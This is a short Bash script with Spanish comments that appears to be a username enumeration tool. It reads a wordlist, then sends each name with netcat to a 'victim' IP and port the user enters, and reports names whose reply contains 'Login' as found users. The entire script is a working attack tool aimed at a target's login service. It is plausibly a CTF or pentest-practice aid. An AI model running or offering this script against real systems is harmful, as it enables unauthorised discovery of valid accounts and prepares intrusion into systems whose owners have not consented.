#!/bin/bash

# Colores
ORANGE='\033[0;33m'
RED='\033[0;31m'
NC='\033[0m' # No Color

# Función para manejar la señal SIGINT (Ctrl + C)
trap 'echo -e "\nSaliendo..."; exit' INT

# Función para autocompletar la ruta del archivo de diccionario
_autocomplete_dictionary_file() {
    local cur
    COMPREPLY=()
    cur="${COMP_WORDS[COMP_CWORD]}"
    
    local files=()
    for file in *; do
        if [[ -f "$file" && "$file" == *"$cur"* ]]; then
            files+=("$file")
        fi
    done
    
    COMPREPLY=($(compgen -W "${files[*]}" -- "$cur"))
    return 0
}

# Habilitar autocompletado para la ruta del archivo de diccionario
complete -F _autocomplete_dictionary_file -o default dictionary_file

# Pedir al usuario la ruta al archivo de diccionario
read -e -p "Introduce la ruta al archivo de diccionario: " dictionary_file

# Pedir al usuario la dirección IP de la víctima
read -p "Introduce la dirección IP de la víctima: " victim_ip

# Pedir al usuario el puerto a escanear
read -p "Introduce el puerto a escanear: " victim_port

# Contador para el progreso del escaneo
count=0

# Total de líneas en el archivo de diccionario
total_lines=$(wc -l < "$dictionary_file")

# Iniciar el escaneo
while IFS= read -r username; do
    ((count++))
    progress=$((count * 100 / total_lines))
    echo -ne "Escaneo en progreso: <$progress%>\r"

    if nc -vn "$victim_ip" "$victim_port" 2>/dev/null <<< "$username" | grep -q "Login"; then
        echo -e "${ORANGE}Usuario encontrado: ${NC} ${RED}$username${NC}"
    fi
done < "$dictionary_file"

echo -e "\nEscaneo completo!"
